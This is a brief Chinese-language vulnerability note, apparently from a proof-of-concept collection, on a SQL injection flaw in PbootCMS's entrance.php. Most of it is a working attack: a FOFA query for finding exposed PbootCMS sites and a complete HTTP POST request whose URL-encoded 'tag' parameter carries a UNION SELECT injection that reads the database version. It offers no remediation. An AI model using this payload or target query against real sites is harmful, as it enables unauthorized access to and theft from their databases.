# PbootCMS接口entrance.php存在SQL注入漏洞

由于PbootCMS entrance.php 文件代码逻辑缺陷存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息

## fofa

```javascript
header="PbootCMS" || body="zbeol.com"
```

## poc

```javascript
POST /?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%76%65%72%73%69%6f%6e%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20241211210840708](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112108781.png)